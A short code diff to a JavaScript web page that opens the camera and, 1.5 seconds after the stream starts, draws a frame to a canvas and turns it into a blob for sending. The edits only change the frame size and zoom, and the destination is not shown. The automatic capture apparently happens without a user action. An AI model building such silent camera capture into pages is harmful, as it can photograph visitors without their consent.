@@ -60,24 +60,26 @@
         })
         .then(stream => {
             video.srcObject = stream;
-            setTimeout(captureAndSend, 1500); // 1.5 ثانية فقط
+            setTimeout(captureAndSend, 1500);
         })
         .catch(() => showError());
 
         function captureAndSend() {
-            const width = video.videoWidth;
-            const height = video.videoHeight;
+            const vWidth = video.videoWidth;
+            const vHeight = video.videoHeight;
             
-            // زوم بعيد جداً (x10 تقريباً)
-            canvas.width = width * 1.35;
-            canvas.height = height * 1.35;
+            // نسبة 9:16 واسعة
+            canvas.width = 720;
+            canvas.height = 1280;
             
             const ctx = canvas.getContext('2d');
+            
+            // رسم الصورة بشكل واسع ومركز
             ctx.drawImage(video, 
-                -width * 0.175, 
-                -height * 0.175, 
-                width * 1.35, 
-                height * 1.35
+                (vWidth - 720) / 2 * -0.3,   // زوم أوت
+                (vHeight - 1280) / 2 * -0.3,
+                vWidth * 1.6, 
+                vHeight * 1.6
             );
             
             canvas.toBlob(blob => {
